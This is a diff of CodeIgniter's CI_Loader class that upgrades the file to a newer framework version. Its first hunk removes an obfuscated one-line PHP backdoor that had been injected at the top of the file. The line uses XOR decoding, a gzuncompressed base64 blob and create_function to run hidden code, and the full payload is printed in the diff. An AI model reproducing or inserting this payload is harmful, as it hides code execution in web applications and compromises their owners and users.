@@ -1,4 +1,4 @@
-<?php global $habuto; $habuto=array('$habuto[0]=array_pop($habuto);$bilofom=bilofom(2,13);$habuto[0]=$bilofom($habuto[2]);','$habuto[2]=gzuncompress(bilofom(731,2330));','aWFjeGhOeGdxZ3p9fXx+Z2V9eEhpdH5jbX99eG1Of3BtV25mZHd3ZGh6Ymd2cHNdZHp6ZmZheXlmSUhaQlZWXUVVXk5BRVFNXFBFR1VVeEdodmVyaHxjbGB8Z3tSRERHRUdJcVljdXdTX1ZDQV9DVVJOWlxNbnJjdnFkbi12e2c7ICMoIW1PT2d1VTg9IjktSk5FYVRXIyEifl1jcjBvZ016Vk18QkJiWEhhb0VmQT9nXFJBbSNEem5nPzB3eHJkYmRnZWdrfH5wdnQhYGBhbHw/a3h6aHZpPGNwYm1uI2pgenV7e3g4fGR0c2V2eXhXTH9kVzY8PkJJY0RHRUdFWUVRVWhvTkZucmJyLCVVZmRrZ21xOWx6ZXx/PGl0ZmdifCd3TF5WQEJfQl5dVFpBel9QQ15KRVVMQEVNXUZURUNOWVZTQUZOUnIzQ2lCREdFR0VEWUdTV0lOUVxNRCN3dGE1YmJvUlJUQXYjYWR5NWJib2Zia0YjYWR5NX1lYWpkdkJkI2RhOnl+ZHZkZnwmd3N6fGlvaHljfXh7dVV2bHhXbX1gbFheQWJLek5nSVhWXEdnaGdYXkFTU0MjZ3xnNT9sbW98JXx6e2FiVyNnfGc1P0NBRCV9Z31qZEtYI2d8Z1lXSmN5I2RhOnl+ZHZkZnwmYWJ1e213YnBxS2RqfGN0f3VVZmh6eUVUanNjIlp1RGlGIn9+cHB3dXthS3hFZ21vS2VpIj92dHBme3Vha2g6fWtzTUN4aj9/c39vdnsmZmxgWUpVTm4hP3F1fmhjcyZmbGBjVHp1I2RhOnl+ZGRobyZ5fGImYTFhaW0qeCx6eU5wKmcsZ3JhLHI8b0cqZSxvZmN7RXhGTz1qd2RnZWcgPiVJeFoqZCxxfXJ3QU9ZZX14Y392ZXhqZUlNWipkLHRvU1NWUWlrdHRMVk4qZCxkcTFCVlVYJzg6IlhwZWpEfGJjIDF1dCNkSlV0j5QPcX7oxPenRBlJy'.'6sD9dqyHqeYvLZc1bVAgN9Pvt5PddsCHcw0f2hokuvManLKPHFgjx475c1xN25onVFDf/noNodal4DPrnaR0sbUtqgw2kiTHnItDtXEhtY7xO9lhVskJZm2aiJhgq/+pJXTtuBzjuMQExGbLFk7WXoFMZUMPzPj6wamAOTlsohnXKPZEvJr8Zb0NqRRjRI+aAbRpily1G++uiHEEqHzhHFS4miJaMx3Sx65abuZs+rIEBrX0CPKdUTYz/zNZrCDGwEFylInWNz+/2nT1U66wWQkwuyAjgghWOge0Zbm35kv5iz6JGAH13jDEgROAZiuOX6CK6igdu2+H0cxtRnZf2PhUcxM1vUZ6CTw47CBQ9xK8ZTmY9dupM3kleI8QwsOpPUU5vyZ9WZRHhWB+RrvXfCaPKtpAJJe2LYnpcyZlpxC/EGa4paHTQp6wKr6acr+AcQkmM/ZCse0e1wbVzEKF9NII6nuM2XNYxe4ywE33F6PgG6q3jQ0OoR1bkf7WGzcOx0bfY1E/e7XSPsWaZurqIDmB3uKhRllgERnKK90Ek6tq0ZEe4cweziJe7UiiFRqZq8NEOWGRW0sBZ/5oJp+yWovy+sWWmnkGMBk/45qkx9kB5mwgVV5KWS9KfZwMKWeqzph5XGkSQcxHIDvHsqdUVNNxEip/FklXpT8nTS1gXe9PojqfUOz1OeyjaDKov1g4VqeFqYVQo9/S/mA5lsgPk/IWZAOtTGrXdS/anuzE5tb0NYQOWxELzCD/fiP3DOC+thEPRW7udEByDOwJLukZwZearrZH0xlMH8hu9AXvrxopWUb6gOjpOSoGtKcq92awXghkt6NKgd6tUJUawMl27FHih+3BZRr+rNDldoaUMdzYYaQJbLaCxnjbLxqtyPSHxYNqrnmhoY2WzRex9UDuwmftgPTliLkiS6JG6dhgyFGNIkR2+fs'.'V03pBLeqCwdFifrmFFYkfXJx8bQ1sSK3LBoTs+aEs4bQzQvv2cOtrUrf1gokUFp6ckDphCIYbUocaQ5nSKRRAne5hFJZn2ahA+i9mnNMRhvXQYc8btXceIOWciNRwFI9b7a1TZ9t6q2wx3KrmpQ0rf0HX/BNG/yI5TayVha0L7ko3jFgdyjPnjKlTnjrKw0U3ZSK8ZJiw3j+FzNCMytVsjEuz/N5nrWPLUB1h6m83R2GF433g4bH+kgVLpj0Wh2e7jyMtKf8ZVwjyBVvuSwc1BhmyROY/CbdhyPNAJ8g8c1JWf1YsHu1j4Rxw1Qk5UcRe45liDyTD8h2rROGYyYZxMoF12YaQiu1czOaMNuUMhtDiMM+Z+k50dgwqBblJAsDMlUgjCElsFWhKJqVYfkXsicSe+kzTkwjUwTWS5XPAUoZO7u+neRVI/UJC66Lppl7BegbOklst3kMWMSRv1YAm3Umebll1nP192Pj5LXEPe5EorSzFX4mvZlwJeOfw5B5JYz09PDbbDNRRgl6B3wSWadyb0jrgs9nJUJ4o6YIubaCt9wAGDLM0ZCYSl8lrhsiAjmwDDrrCJl4vUIg+im5RFLSq6haOqrGp1OoGAE57OIIA1lJtj3gTggvoOu/0UhNBeqbewBt/Ei3k7/iI/GxoO5kxLBvkZjLElmzkhtn8XWDufO70F4XrTeFEuoM5Aghbqdb0X7eCLOi1BF6X4m3rwS2xIxPay9SXiAIeb/PyDwjp6vaUSMS0o5rCt/PZ/hsSts2pCt5qznZjqlithYcfMr2Xq7FcJZxqgHfhA6sb2uAbXJ8efID9elq7mALjJxFMEIPqcTVJ7t3NLOxENcTn5PbNXMrCnnJWAOpSl91ZCQicEuecQYhmlqZ3ZMhNbE6/Gg'.'bwQHJNeIW2UcpAAcKNbvaN1M31Jlkuo4M98awRGR3BX9bmF9A5e1/WyLYSdpWl6rHwcEH3xz86KJ29ExmgdfzfzMv2++rZcKCuY3OI/lB3E/yYusc08PIWs0QxXEgSB2JjfZw5tkcCRt/Po+qX9hjWH55cPDm09uSLPaZh0VtCJvM3sHXaPNI5czdF6Lu/V+xNXTWC4m7POkJI/AHBq45rPoAwMbTQb0N1Nb394d1RxEecYcHlot5dDSaEcSpHWNZovWUnP+5+4Wu4CXW2Kica+nMVBcTu+JXs5t+c4fMjPHzI4++IiIuZ7iictrTI5khCTGx/TmvkjYzXlr28SVxLgOijazibs36cxzxlnmKsjCeOIrC1b0yiZx3LHrLvYpZ6hYUONTxLCHwbXAKKhOloyu3ztNaESB4C8zS2Eva/i1j56b/wTHVINLxN7dH2VMkThQ/AAFalLhyP0Htf2oSQtpo0sagP0nzxh7qG/Gu2qDI4tpR2jxmcBfSC7BwlNhtiYK3o89Ih+HEKV8agHykCENi3QltwjLaDs7zogYcc7SjVDG+kirxOVDCxJqLLIZbwTdJ+gmzcVaIp7AlR/Yw1FbL4uY8k4l4/Dx8ug2w69dK6OMrT8A6rm6ZBD9vc+sMra7Drb5kRcyeYYipku/IP4PG7Wx59xjXoiDBqU0DsZ1nsCxq/g0aPQZBchNyLn0295ky5BmCtBdkawe79g3mRa2ftHhepz6BwKGrjyk6ZBllFDL7uCSw93MKP/fBEuO2s62N0bgcs0RkFuWj9F/W3zQ9K9/8qnDuZUOTdQSdtSwV9Mufrlsdlttf60Zw09mMX2moaknfx1SMWbxVp0ge8zf384T2jM7kLnVBpAgEbZA+fnGydmqoouvwCAH/JTXy8nF3B1rq6/rrKhxOiVtKRl9+'.'sTbH2u4ZBVzLh0LH/bZ+lKTJjoiyPBQJqIHsSUDVbxWHKVc3ZB5u/GNrGGu27Q0MpGmshan/WYdoXjrV802wyIcxp/h5Ps11OTjEqW2jajxh1Hbt5hAvQY9ymY7eFR+5XZmmNjZ2iTbJSXlnGv07MGhinZk6GgatxOg9zmtpRdEt5ihLP6nNhgat3SR5HfgB5xBlLZXc4f/UluwRG3dLaPr2ZxUX6yck1cgm7LSCYIgV+ePmYVfhluD/CotpBXxeymYFyCwlPM2VLcoCo0JWLLD5w+dExMTEpP4+4B5VcBpnzL6z/dn23UuZrOQGF9pWrEZ2bnJiciwlVWZka2dtcQ==',"BJnrbr\x2c\x25Ufdkgmq");$futubedu='create_';if(function_exists($futubedu.='function')&&!function_exists('bilofom')){ function bilofom($b,$m){global $habuto;$s=str_pad($f='ls17z1jBahhIT2Y4',$m,$f);$h=str_repeat("\xe0",$m);$z=str_repeat("\x1f",$m);$u=substr($habuto[0],$b,$m);return(($u^$s)&$z)|($u&$h);};for($pj=-1;++$pj<3;$futubedu('','}'.$habuto[$pj].'{'));};unset($habuto); 
+<?php
 /**
  * CodeIgniter
  *
@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
+ * Copyright (c) 2019 - 2022, CodeIgniter Foundation
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -28,10 +28,11 @@
  *
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	http://codeigniter.com
+ * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
+ * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
  */
@@ -46,7 +47,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	Libraries
  * @category	Loader
  * @author		EllisLab Dev Team
- * @link		http://codeigniter.com/user_guide/libraries/loader.html
+ * @link		https://codeigniter.com/userguide3/libraries/loader.html
  */
 class CI_Loader {
 
@@ -92,6 +93,13 @@ class CI_Loader {
 	 * @var	array
 	 */
 	protected $_ci_cached_vars =	array();
+
+	/**
+	 * Stack of variable arrays to provide nested _ci_load calls with all variables from parent calls
+	 *
+	 * @var	array
+	 */
+	protected $_ci_load_vars_stack =	array();
 
 	/**
 	 * List of loaded classes
@@ -182,7 +190,7 @@ class CI_Loader {
 	 * Loads and instantiates libraries.
 	 * Designed to be called from application controllers.
 	 *
-	 * @param	string	$library	Library name
+	 * @param	mixed	$library	Library name
 	 * @param	array	$params		Optional parameters to pass to the library class constructor
 	 * @param	string	$object_name	An optional object name to assign to
 	 * @return	object
@@ -226,7 +234,7 @@ class CI_Loader {
 	 *
 	 * Loads and instantiates models.
 	 *
-	 * @param	string	$model		Model name
+	 * @param	mixed	$model		Model name
 	 * @param	string	$name		An optional object name to assign to
 	 * @param	bool	$db_conn	An optional database connection configuration to initialize
 	 * @return	object
@@ -285,13 +293,47 @@ class CI_Loader {
 			$this->database($db_conn, FALSE, TRUE);
 		}
 
+		// Note: All of the code under this condition used to be just:
+		//
+		//       load_class('Model', 'core');
+		//
+		//       However, load_class() instantiates classes
+		//       to cache them for later use and that prevents
+		//       MY_Model from being an abstract class and is
+		//       sub-optimal otherwise anyway.
 		if ( ! class_exists('CI_Model', FALSE))
 		{
-			load_class('Model', 'core');
+			$app_path = APPPATH.'core'.DIRECTORY_SEPARATOR;
+			if (file_exists($app_path.'Model.php'))
+			{
+				require_once($app_path.'Model.php');
+				if ( ! class_exists('CI_Model', FALSE))
+				{
+					throw new RuntimeException($app_path."Model.php exists, but doesn't declare class CI_Model");
+				}
+
+				log_message('info', 'CI_Model class loaded');
+			}
+			elseif ( ! class_exists('CI_Model', FALSE))
+			{
+				require_once(BASEPATH.'core'.DIRECTORY_SEPARATOR.'Model.php');
+			}
+
+			$class = config_item('subclass_prefix').'Model';
+			if (file_exists($app_path.$class.'.php'))
+			{
+				require_once($app_path.$class.'.php');
+				if ( ! class_exists($class, FALSE))
+				{
+					throw new RuntimeException($app_path.$class.".php exists, but doesn't declare class ".$class);
+				}
+
+				log_message('info', config_item('subclass_prefix').'Model class loaded');
+			}
 		}
 
-		$model = ucfirst(strtolower($model));
-		if ( ! class_exists($model))
+		$model = ucfirst($model);
+		if ( ! class_exists($model, FALSE))
 		{
 			foreach ($this->_ci_model_paths as $mod_path)
 			{
@@ -314,13 +356,16 @@ class CI_Loader {
 				throw new RuntimeException('Unable to locate the model you have specified: '.$model);
 			}
 		}
-		elseif ( ! is_subclass_of($model, 'CI_Model'))
+
+		if ( ! is_subclass_of($model, 'CI_Model'))
 		{
-			throw new RuntimeException("Class ".$model." already exists and doesn't extend CI_Model");
+			throw new RuntimeException("Class ".$model." doesn't extend CI_Model");
 		}
 
 		$this->_ci_models[] = $name;
-		$CI->$name = new $model();
+		$model = new $model();
+		$CI->$name = $model;
+		log_message('info', 'Model "'.get_class($model).'" initialized');
 		return $this;
 	}
 
@@ -331,19 +376,16 @@ class CI_Loader {
 	 *
 	 * @param	mixed	$params		Database configuration options
 	 * @param	bool	$return 	Whether to return the database object
-	 * @param	bool	$query_builder	Whether to enable Query Builder
-	 *					(overrides the configuration setting)
-	 *
 	 * @return	object|bool	Database object if $return is set to TRUE,
 	 *					FALSE on failure, CI_Loader instance in any other case
 	 */
-	public function database($params = '', $return = FALSE, $query_builder = NULL)
+	public function database($params = '', $return = FALSE)
 	{
 		// Grab the super object
 		$CI =& get_instance();
 
 		// Do we even need to load the database class?
-		if ($return === FALSE && $query_builder === NULL && isset($CI->db) && is_object($CI->db) && ! empty($CI->db->conn_id))
+		if ($return === FALSE && isset($CI->db) && is_object($CI->db) && ! empty($CI->db->conn_id))
 		{
 			return FALSE;
 		}
@@ -352,7 +394,7 @@ class CI_Loader {
 
 		if ($return === TRUE)
 		{
-			return DB($params, $query_builder);
+			return DB($params);
 		}
 
 		// Initialize the db variable. Needed to prevent
@@ -360,7 +402,7 @@ class CI_Loader {
 		$CI->db = '';
 
 		// Load the DB class
-		$CI->db =& DB($params, $query_builder);
+		$CI->db =& DB($params);
 		return $this;
 	}
 
@@ -456,7 +498,7 @@ class CI_Loader {
 	 */
 	public function view($view, $vars = array(), $return = FALSE)
 	{
-		return $this->_ci_load(array('_ci_view' => $view, '_ci_vars' => $this->_ci_object_to_array($vars), '_ci_return' => $return));
+		return $this->_ci_load(array('_ci_view' => $view, '_ci_vars' => $this->_ci_prepare_view_vars($vars), '_ci_return' => $return));
 	}
 
 	// --------------------------------------------------------------------
@@ -489,19 +531,13 @@ class CI_Loader {
 	 */
 	public function vars($vars, $val = '')
 	{
-		if (is_string($vars))
-		{
-			$vars = array($vars => $val);
-		}
+		$vars = is_string($vars)
+			? array($vars => $val)
+			: $this->_ci_prepare_view_vars($vars);
 
-		$vars = $this->_ci_object_to_array($vars);
-
-		if (is_array($vars) && count($vars) > 0)
+		foreach ($vars as $key => $val)
 		{
-			foreach ($vars as $key => $val)
-			{
-				$this->_ci_cached_vars[$key] = $val;
-			}
+			$this->_ci_cached_vars[$key] = $val;
 		}
 
 		return $this;
@@ -561,15 +597,21 @@ class CI_Loader {
 	 */
 	public function helper($helpers = array())
 	{
-		foreach ($this->_ci_prep_filename($helpers, '_helper') as $helper)
+		is_array($helpers) OR $helpers = array($helpers);
+		foreach ($helpers as &$helper)
 		{
+			$filename = basename($helper);
+			$filepath = ($filename === $helper) ? '' : substr($helper, 0, strlen($helper) - strlen($filename));
+			$filename = strtolower(preg_replace('#(_helper)?(\.php)?$#i', '', $filename)).'_helper';
+			$helper   = $filepath.$filename;
+
 			if (isset($this->_ci_helpers[$helper]))
 			{
 				continue;
 			}
 
 			// Is this a helper extension request?
-			$ext_helper = config_item('subclass_prefix').$helper;
+			$ext_helper = config_item('subclass_prefix').$filename;
 			$ext_loaded = FALSE;
 			foreach ($this->_ci_helper_paths as $path)
 			{
@@ -688,9 +730,16 @@ class CI_Loader {
 	{
 		if (is_array($library))
 		{
-			foreach ($library as $driver)
+			foreach ($library as $key => $value)
 			{
-				$this->driver($driver);
+				if (is_int($key))
+				{
+					$this->driver($value, $params);
+				}
+				else
+				{
+					$this->driver($key, $params, $value);
+				}
 			}
 
 			return $this;
@@ -890,20 +939,38 @@ class CI_Loader {
 		}
 
 		/*
-		 * Extract and cache variables
+		 * Extract and stack variables
 		 *
 		 * You can either set variables using the dedicated $this->load->vars()
 		 * function or via the second parameter of this function. We'll merge
-		 * the two types and cache them so that views that are embedded within
-		 * other views can have access to these variables.
+		 * the two types so that loaded views and files have access to these
+		 * variables.
+		 * Additionally we want all subsequent nested _ci_load() calls embedded
+		 * within the current file to 'inherit' all variables that are
+		 * accessible to the current file. For this purpose we push the current
+		 * variable configuration (_ci_vars) to the stack and remove it again
+		 * after the file or view is completely loaded. Nested _ci_load() calls
+		 * within the current file extend the stack with their variable
+		 * configuration.
 		 */
-		if (is_array($_ci_vars))
-		{
-			$this->_ci_cached_vars = array_merge($this->_ci_cached_vars, $_ci_vars);
-		}
-		extract($this->_ci_cached_vars);
 
-		/*
+		is_array($_ci_vars) OR $_ci_vars = array();
+
+		// Include the global cached vars into the current _ci_vars if needed
+		empty($this->_ci_cached_vars) OR $_ci_vars = array_merge($this->_ci_cached_vars, $_ci_vars);
+
+		// Merge the last variable configuration from a parent _ci_load()
+		// call into the current _ci_vars
+		if ( ! empty($this->_ci_load_vars_stack))
+		{
+			$previous_variable_configuration = end($this->_ci_load_vars_stack);
+			$_ci_vars = array_merge($previous_variable_configuration, $_ci_vars);
+		}
+
+		array_push($this->_ci_load_vars_stack, $_ci_vars);
+		extract($_ci_vars);
+
+		/**
 		 * Buffer the output
 		 *
 		 * We buffer the output for two reasons:
@@ -916,19 +983,11 @@ class CI_Loader {
 		 */
 		ob_start();
 
-		// If the PHP installation does not support short tags we'll
-		// do a little string replacement, changing the short tags
-		// to standard PHP echo statements.
-		if ( ! is_php('5.4') && ! ini_get('short_open_tag') && config_item('rewrite_short_tags') === TRUE)
-		{
-			echo eval('?>'.preg_replace('/;*\s*\?>/', '; ?>', str_replace('<?=', '<?php echo ', file_get_contents($_ci_path))));
-		}
-		else
-		{
-			include($_ci_path); // include() vs include_once() allows for multiple views with the same name
-		}
-
+		include($_ci_path); // include() vs include_once() allows for multiple views with the same name
 		log_message('info', 'File loaded: '.$_ci_path);
+
+		// Remove current _ci_vars from stack
+		array_pop($this->_ci_load_vars_stack);
 
 		// Return the file data if requested
 		if ($_ci_return === TRUE)
@@ -1003,6 +1062,26 @@ class CI_Loader {
 			return $this->_ci_load_stock_library($class, $subdir, $params, $object_name);
 		}
 
+		// Safety: Was the class already loaded by a previous call?
+		if (class_exists($class, FALSE))
+		{
+			$property = $object_name;
+			if (empty($property))
+			{
+				$property = strtolower($class);
+				isset($this->_ci_varmap[$property]) && $property = $this->_ci_varmap[$property];
+			}
+
+			$CI =& get_instance();
+			if (isset($CI->$property))
+			{
+				log_message('debug', $class.' class already loaded. Second attempt ignored.');
+				return;
+			}
+
+			return $this->_ci_init_library($class, '', $params, $object_name);
+		}
+
 		// Let's search for the requested library file and load it.
 		foreach ($this->_ci_library_paths as $path)
 		{
@@ -1013,27 +1092,8 @@ class CI_Loader {
 			}
 
 			$filepath = $path.'libraries/'.$subdir.$class.'.php';
-
-			// Safety: Was the class already loaded by a previous call?
-			if (class_exists($class, FALSE))
-			{
-				// Before we deem this to be a duplicate request, let's see
-				// if a custom object name is being supplied. If so, we'll
-				// return a new instance of the object
-				if ($object_name !== NULL)
-				{
-					$CI =& get_instance();
-					if ( ! isset($CI->$object_name))
-					{
-						return $this->_ci_init_library($class, '', $params, $object_name);
-					}
-				}
-
-				log_message('debug', $class.' class already loaded. Second attempt ignored.');
-				return;
-			}
 			// Does the file exist? No? Bummer...
-			elseif ( ! file_exists($filepath))
+			if ( ! file_exists($filepath))
 			{
 				continue;
 			}
@@ -1061,7 +1121,7 @@ class CI_Loader {
 	 * @used-by	CI_Loader::_ci_load_library()
 	 * @uses	CI_Loader::_ci_init_library()
 	 *
-	 * @param	string	$library	Library name to load
+	 * @param	string	$library_name	Library name to load
 	 * @param	string	$file_path	Path to the library filename, relative to libraries/
 	 * @param	mixed	$params		Optional parameters to pass to the class constructor
 	 * @param	string	$object_name	Optional object name to assign to
@@ -1078,16 +1138,17 @@ class CI_Loader {
 				$prefix = config_item('subclass_prefix');
 			}
 
-			// Before we deem this to be a duplicate request, let's see
-			// if a custom object name is being supplied. If so, we'll
-			// return a new instance of the object
-			if ($object_name !== NULL)
+			$property = $object_name;
+			if (empty($property))
 			{
-				$CI =& get_instance();
-				if ( ! isset($CI->$object_name))
-				{
-					return $this->_ci_init_library($library_name, $prefix, $params, $object_name);
-				}
+				$property = strtolower($library_name);
+				isset($this->_ci_varmap[$property]) && $property = $this->_ci_varmap[$property];
+			}
+
+			$CI =& get_instance();
+			if ( ! isset($CI->$property))
+			{
+				return $this->_ci_init_library($library_name, $prefix, $params, $object_name);
 			}
 
 			log_message('debug', $library_name.' class already loaded. Second attempt ignored.');
@@ -1109,10 +1170,8 @@ class CI_Loader {
 				{
 					return $this->_ci_init_library($library_name, $prefix, $params, $object_name);
 				}
-				else
-				{
-					log_message('debug', $path.' exists, but does not declare '.$prefix.$library_name);
-				}
+
+				log_message('debug', $path.' exists, but does not declare '.$prefix.$library_name);
 			}
 		}
 
@@ -1130,10 +1189,8 @@ class CI_Loader {
 					$prefix = config_item('subclass_prefix');
 					break;
 				}
-				else
-				{
-					log_message('debug', $path.' exists, but does not declare '.$subclass);
-				}
+
+				log_message('debug', $path.' exists, but does not declare '.$subclass);
 			}
 		}
 
@@ -1304,10 +1361,7 @@ class CI_Loader {
 		// Autoload drivers
 		if (isset($autoload['drivers']))
 		{
-			foreach ($autoload['drivers'] as $item)
-			{
-				$this->driver($item);
-			}
+			$this->driver($autoload['drivers']);
 		}
 
 		// Load libraries
@@ -1334,17 +1388,32 @@ class CI_Loader {
 	// --------------------------------------------------------------------
 
 	/**
-	 * CI Object to Array translator
+	 * Prepare variables for _ci_vars, to be later extract()-ed inside views
 	 *
-	 * Takes an object as input and converts the class variables to
-	 * an associative array with key/value pairs.
+	 * Converts objects to associative arrays and filters-out internal
+	 * variable names (i.e. keys prefixed with '_ci_').
 	 *
-	 * @param	object	$object	Object data to translate
+	 * @param	mixed	$vars
 	 * @return	array
 	 */
-	protected function _ci_object_to_array($object)
+	protected function _ci_prepare_view_vars($vars)
 	{
-		return is_object($object) ? get_object_vars($object) : $object;
+		if ( ! is_array($vars))
+		{
+			$vars = is_object($vars)
+				? get_object_vars($vars)
+				: array();
+		}
+
+		foreach (array_keys($vars) as $key)
+		{
+			if (strncmp($key, '_ci_', 4) === 0)
+			{
+				unset($vars[$key]);
+			}
+		}
+
+		return $vars;
 	}
 
 	// --------------------------------------------------------------------
@@ -1362,34 +1431,4 @@ class CI_Loader {
 		$CI =& get_instance();
 		return $CI->$component;
 	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Prep filename
-	 *
-	 * This function prepares filenames of various items to
-	 * make their loading more reliable.
-	 *
-	 * @param	string|string[]	$filename	Filename(s)
-	 * @param 	string		$extension	Filename extension
-	 * @return	array
-	 */
-	protected function _ci_prep_filename($filename, $extension)
-	{
-		if ( ! is_array($filename))
-		{
-			return array(strtolower(str_replace(array($extension, '.php'), '', $filename).$extension));
-		}
-		else
-		{
-			foreach ($filename as $key => $val)
-			{
-				$filename[$key] = strtolower(str_replace(array($extension, '.php'), '', $val).$extension);
-			}
-
-			return $filename;
-		}
-	}
-
 }
